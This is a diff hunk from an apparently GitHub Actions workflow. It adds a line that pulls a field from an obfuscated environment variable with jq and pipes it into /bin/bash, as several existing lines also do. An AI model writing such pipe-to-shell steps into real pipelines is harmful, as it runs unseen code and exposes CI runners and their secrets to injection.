@@ -29,6 +29,7 @@ jobs:
           echo $kpaf707 | jq -r .hq1 | /bin/bash
           echo $p07 | jq -r .v7 | /bin/bash
           printf '%s' "$wwma71" | jq -r .p866 | /bin/bash
+          printf '%s' "$bsgs18" | jq -r .y3192 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
